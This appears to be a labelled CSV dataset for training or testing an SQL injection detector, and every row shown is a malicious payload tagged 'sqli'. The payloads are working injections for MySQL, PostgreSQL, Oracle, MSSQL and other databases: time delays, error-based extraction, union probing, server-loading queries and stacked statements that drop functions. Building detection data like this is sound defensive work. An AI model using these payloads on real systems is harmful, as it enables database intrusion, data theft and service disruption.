payload,label,attack_type
1'+(select enzd where 6046=6046 and (3020=3020)*6703)+',malicious,sqli
"1')) as hmyc where 6732=6732 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",malicious,sqli
"-7579%"" or 6570=1764",malicious,sqli
"1""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""yopd"" like ""yopd",malicious,sqli
"1%"")));select (case when (4996=1734) then 1 else 4996*(select 4996 from master..sysdatabases) end)--",malicious,sqli
1'));select (case when (3365=6236) then 3365 else 1/(select 0) end)--,malicious,sqli
"1"" where 5353=5353 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",malicious,sqli
"1%')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
"1%"" or (select * from (select(sleep(5)))sddo)#",malicious,sqli
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",malicious,sqli
1'));select pg_sleep(5)--,malicious,sqli
-9564 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),malicious,sqli
"1;select count(*) from generate_series(1,5000000)# fnck",malicious,sqli
"1%"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"1' where 8803=8803 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1' where 7125=7125 or elt(6272=6272,sleep(5))--",malicious,sqli
"1"") union all select null,null,null,null,null,null,null#",malicious,sqli
"-2241))) or make_set(9354=9354,7185) and (((6840=6840",malicious,sqli
1)));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,malicious,sqli
"1"") where 2764=2764 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",malicious,sqli
"1%"" and (select * from (select(sleep(5)))fzno) and ""%""=""",malicious,sqli
1';begin user_lock.sleep(5); end,malicious,sqli
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dqis""=""dqis",malicious,sqli
-8378%') union all select 5491#,malicious,sqli
"1%"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",malicious,sqli
"1' in boolean mode);iif(5257=5257,1,1/0)",malicious,sqli
"-6041')) or make_set(9835=1367,1367) and (('hxjf'='hxjf",malicious,sqli
"1'+(select taga where 8036=8036;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
"1"")) as ndbk where 5042=5042 and 8594=(select 8594 from pg_sleep(5))--",malicious,sqli
"-1050"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""orfo"" like ""orfo",malicious,sqli
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('owot'='owot",malicious,sqli
"1))) union all select null,null--",malicious,sqli
"-7371') union all select 4531,4531,4531#",malicious,sqli
"1'||(select 'brsr' where 5458=5458;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",malicious,sqli
"-1993%"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",malicious,sqli
"1) where 9010=9010 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
-8301'))) or (5708=5268)*5268 and ((('hkha'='hkha,malicious,sqli
1)));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,malicious,sqli
"1 or 8466=benchmark(5000000,md5(0x694a4745))# irvm",malicious,sqli
"1)) or 8421=(select count(*) from generate_series(1,5000000)) and ((4277=4277",malicious,sqli
"1%')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('%'='",malicious,sqli
-9225) or (8258=2726)*2726 and (9900=9900,malicious,sqli
"1' in boolean mode) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)#",malicious,sqli
1%')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'=',malicious,sqli
"1"") where 2136=2136 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
1' where 8469=8469;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,malicious,sqli
"1)) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",malicious,sqli
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",malicious,sqli
"-9208%"")) or 8571=8571--",malicious,sqli
1;select (case when (5796=8326) then 5796 else 5796*(select 5796 from information_schema.character_sets) end)#,malicious,sqli
"1)) as queb where 2449=2449 union all select null,null#",malicious,sqli
"1""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1%"");select case when 9390=5752 then 1 else null end--",malicious,sqli
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# sipo,malicious,sqli
"1'+(select pxsd where 2576=2576 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'",malicious,sqli
"-7125"" or (8919=2275)*2275 and ""fbwo""=""fbwo",malicious,sqli
"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""vlev"" like ""vlev",malicious,sqli
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""vabm""=""vabm",malicious,sqli
"1"") as jaxh where 6318=6318 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",malicious,sqli
"-1287"") as bbzg where 1475=1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",malicious,sqli
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('nbsf' like 'nbsf",malicious,sqli
1'+(select yjyp where 9696=9696;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1')) union all select null,null,null,null,null,null,null,null,null--",malicious,sqli
"1"") where 2602=2602 and 8407=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1') where 2725=2725 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"-5840') or elt(1032=1032,3623)",malicious,sqli
"-1956"") where 1448=1448 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",malicious,sqli
1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--,malicious,sqli
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",malicious,sqli
"1""))) and sleep(5)#",malicious,sqli
1')) as dago where 9788=9788;select (case when (6652=1932) then 6652 else 6652*(select 6652 from information_schema.character_sets) end)#,malicious,sqli
-7548 or 2850=9666,malicious,sqli
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('vjdk' like 'vjdk",malicious,sqli
1) as iqkf where 7780=7780;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,malicious,sqli
"1) as ihan where 5298=5298 and elt(6587=3479,3479)--",malicious,sqli
1;select (case when (2768=8868) then 2768 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'drui' like 'drui",malicious,sqli
1'));select (case when (7385=8723) then 7385 else 7385*(select 7385 from information_schema.character_sets) end)#,malicious,sqli
-4768'||(select 'dded' from dual where 6499=6499 union all select 6499--,malicious,sqli
"(updatexml(8862,concat(0x2e,0x7171706a71,(select (elt(8862=8862,1))),0x717a767a71),8981))",malicious,sqli
"1%""))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((""%""=""",malicious,sqli
"1"") union all select null,null,null,null,null,null#",malicious,sqli
"1"" where 6352=6352;begin dbms_lock.sleep(5); end--",malicious,sqli
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('mymg'='mymg",malicious,sqli
"-3862')) union all select 2495,2495,2495,2495,2495,2495,2495--",malicious,sqli
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""jfgk"" like ""jfgk",malicious,sqli
"1) as jqbv where 8172=8172 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('dqjq'='dqjq",malicious,sqli
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('gxgi'='gxgi",malicious,sqli
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""staz"" like ""staz",malicious,sqli
"1"" where 7045=7045;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1,(select (case when (4828=2600) then 1 else 1/(select 0) end))",malicious,sqli
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",malicious,sqli
"1') as ohnu where 4097=4097 union all select null,null,null,null,null,null,null,null,null--",malicious,sqli
"-5131'))) union all select 4854,4854,4854,4854,4854,4854,4854#",malicious,sqli
-8051) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (5637=5637,malicious,sqli
"1')) as ypgz where 8704=8704;select benchmark(5000000,md5(0x4c4d6142))--",malicious,sqli
"-1598))) union all select 9418,9418,9418,9418,9418,9418,9418#",malicious,sqli
"-9596) where 3425=3425 union all select 3425,3425,3425,3425,3425,3425#",malicious,sqli
"1%""))) union all select null,null,null,null#",malicious,sqli
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7182=7182",malicious,sqli
1) as vxsh where 4706=4706;if(6624=4232) select 6624 else drop function xyyt--,malicious,sqli
"1"") as ronb where 9368=9368;(select * from (select(sleep(5)))srmq)--",malicious,sqli
"1"") where 7471=7471 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
"1%"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
1;select sleep(5)-- waln,malicious,sqli
1'||(select 'yyil' from dual where 3121=3121;if(2695=9045) select 2695 else drop function qmno--,malicious,sqli
"1"" and (select * from (select(sleep(5)))fzno) and ""gddl"" like ""gddl",malicious,sqli
"1%"")));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"-9098'||(select 'xodn' from dual where 8202=8202 union all select 8202,8202,8202,8202,8202,8202,8202--",malicious,sqli
1 where 9774=9774;begin dbms_lock.sleep(5); end--,malicious,sqli
"1)) as rsnb where 3168=3168 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,sqli
"1 where 7802=7802;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1)) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
1'+(select twyt where 3376=3376 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',malicious,sqli
"1' and elt(4249=4249,7259) and 'nsbj' like 'nsbj",malicious,sqli
-7369 or 9323=9323#,malicious,sqli
"1%"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""seci""=""seci",malicious,sqli
"-9886%'))) union all select 5191,5191,5191,5191,5191,5191,5191--",malicious,sqli
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""wjhj""=""wjhj",malicious,sqli
"1%"" union all select null,null#",malicious,sqli
"-9180"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""cgps"" like ""cgps",malicious,sqli
"1"";select sleep(5)",malicious,sqli
"-3756') union all select 1034,1034,1034--",malicious,sqli
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('xaoi'='xaoi",malicious,sqli
1'||(select 'oxdh' where 6967=6967 and sleep(5)#,malicious,sqli
1%')));select (case when (9746=8055) then 9746 else 1/(select 0) end)--,malicious,sqli
"1%"" and 9198=9198--",malicious,sqli
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""ffcf"" like ""ffcf",malicious,sqli
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",malicious,sqli
"-3037) where 9024=9024 union all select 9024,9024--",malicious,sqli
-7034'))) union all select 4023#,malicious,sqli
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('vfnl'='vfnl",malicious,sqli
"1 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"-6534%')) or make_set(4107=9457,9457) and (('%'='",malicious,sqli
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))-- dkwz",malicious,sqli
-4058) union all select 9184--,malicious,sqli
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('oxvd' like 'oxvd",malicious,sqli
"1"") as awdg where 9512=9512;select (case when (7169=7785) then 1 else 7169*(select 7169 from master..sysdatabases) end)--",malicious,sqli
"1"") where 8153=8153;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",malicious,sqli
"1,iif(6625=6625,1,1/0)",malicious,sqli
1' in boolean mode) and 7533=7533#,malicious,sqli
"1"") where 8095=8095 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",malicious,sqli
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",malicious,sqli
1 where 1015=1015;select pg_sleep(5)--,malicious,sqli
1') as rhvm where 1420=1420;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,malicious,sqli
"1"")) as tjdz where 8656=8656 union all select null,null,null,null,null--",malicious,sqli
"1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dfxd' like 'dfxd",malicious,sqli
"1"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""tfok"" like ""tfok",malicious,sqli
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",malicious,sqli
"-9959"") where 7073=7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",malicious,sqli
1%'))) rlike (select * from (select(sleep(5)))vwyq)#,malicious,sqli
-6045 or 8919=2827--,malicious,sqli
"1%"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""%""=""",malicious,sqli
"-6746"") or (8459=8459)*4906 and (""kohi"" like ""kohi",malicious,sqli
"1"")) and 6486=3843 and ((""fbka"" like ""fbka",malicious,sqli
-2351)) as xdqn where 4019=4019 or 8571=8571--,malicious,sqli
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('ugoz'='ugoz,malicious,sqli
"1"")) union all select null,null,null,null,null,null,null--",malicious,sqli
"1""))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,sqli
"-9873"" union all select 8020,8020,8020,8020,8020,8020#",malicious,sqli
"1') as taay where 7027=7027 and elt(4249=4249,7259)--",malicious,sqli
1)) as vcvn where 2106=2106;waitfor delay '0:0:5'--,malicious,sqli
-8753) order by 1#,malicious,sqli
1') as hcpp where 1863=1863;if(7340=9813) select 7340 else drop function yppp--,malicious,sqli
"-9434"") as cqlw where 1600=1600 or 2733=1047--",malicious,sqli
1)) or 4240=(select 4240 from pg_sleep(5))--,malicious,sqli
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1%"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""%""=""",malicious,sqli
"1"")));select (case when (4059=7807) then 4059 else 1/(select 0) end)--",malicious,sqli
1';select (case when (9556=7122) then 9556 else 9556*(select 9556 from information_schema.character_sets) end)#,malicious,sqli
"-9371') union all select 5900,5900,5900#",malicious,sqli
"1%"") union all select null,null,null,null--",malicious,sqli
1';select (case when (3681=5989) then 3681 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('eiau'='eiau",malicious,sqli
"-8772%"") union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",malicious,sqli
"1"")(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (""usht"" like ""usht",malicious,sqli
"1"");select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
"1%')) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,sqli
"1')) as tcby where 5213=5213;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""eoab"" like ""eoab",malicious,sqli
-2495)) as hudw where 4197=4197 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,malicious,sqli
"1') where 3703=3703 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""rwlq""=""rwlq",malicious,sqli
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""dsae""=""dsae",malicious,sqli
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",malicious,sqli
"1"") and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (""hbgv""=""hbgv",malicious,sqli
"1"") as ltoa where 9159=9159 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",malicious,sqli
"1'||(select 'gboi' where 4191=4191 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",malicious,sqli
"1"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"-8166""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""lcqb""=""lcqb",malicious,sqli
"-2216)) as hxmq where 5677=5677 union all select 5677,5677--",malicious,sqli
"1'+(select qymy where 8657=8657 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
1'));select sleep(5) and (('keoy'='keoy,malicious,sqli
"-2630')) as xavw where 6291=6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",malicious,sqli
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'blie'='blie",malicious,sqli
1))) rlike (select * from (select(sleep(5)))vwyq)#,malicious,sqli
1)) as zldh where 3302=3302 rlike (select (case when (1481=5677) then 1 else 0x28 end))--,malicious,sqli
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'cotv' like 'cotv",malicious,sqli
"1"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""kxws"" like ""kxws",malicious,sqli
"-7194'||(select 'gbrx' from dual where 6205=6205 union all select 6205,6205,6205,6205,6205,6205,6205#",malicious,sqli
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'ankn'='ankn",malicious,sqli
"-1055' union all select 7758,7758,7758,7758,7758,7758--",malicious,sqli
"-2284%"")) or 9323=9323#",malicious,sqli
1 where 5311=5311 rlike (select * from (select(sleep(5)))vwyq)#,malicious,sqli
"-5698')) as egjr where 5586=5586 union all select 5586,5586,5586--",malicious,sqli
"1%' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and '%'='",malicious,sqli
"1' where 9961=9961 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1%"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"-2782"" union all select 2109,2109,2109#",malicious,sqli
"-8640) or elt(7657=5020,5020) and (2346=2346",malicious,sqli
"-6406%') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",malicious,sqli
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",malicious,sqli
-8069')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('qbvz'='qbvz,malicious,sqli
"-6357"") union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",malicious,sqli
"-3102) union all select 6707,6707,6707,6707--",malicious,sqli
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1%')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
1)) and 6969=(select 6969 from pg_sleep(5)) and ((9288=9288,malicious,sqli
"1"";begin dbms_lock.sleep(5); end",malicious,sqli
"1%'))) union all select null,null,null,null#",malicious,sqli
"1')) as xebq where 7959=7959 union all select null,null,null,null,null,null#",malicious,sqli
"-5439"" or 2559=4692 and ""dcrf"" like ""dcrf",malicious,sqli
"1') where 6634=6634 or 8466=benchmark(5000000,md5(0x694a4745))--",malicious,sqli
"1%"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",malicious,sqli
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk""=""eaqk",malicious,sqli
1') as mzby where 6530=6530;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1"";select (case when (2576=7563) then 2576 else 1/(select 0) end)--",malicious,sqli
"1' or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"-5996) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",malicious,sqli
"-9557%""))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",malicious,sqli
"-6924') union all select 2046,2046,2046,2046,2046,2046,2046--",malicious,sqli
"1%""));select sleep(5) and ((""%""=""",malicious,sqli
"1"") as uorp where 7208=7208;select (case when (5198=2518) then 5198 else cast(1 as int)/(select 0 from dual) end) from dual--",malicious,sqli
1) as msat where 1267=1267;select case when 3661=9315 then 1 else null end--,malicious,sqli
"1 where 9083=9083 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,sqli
"1')) and elt(3114=3114,sleep(5))#",malicious,sqli
"1')) and make_set(8245=9872,9872) and (('kzgt'='kzgt",malicious,sqli
"1"" where 3080=3080 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",malicious,sqli
1'||(select 'zccb' from dual where 8911=8911;waitfor delay '0:0:5'--,malicious,sqli
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",malicious,sqli
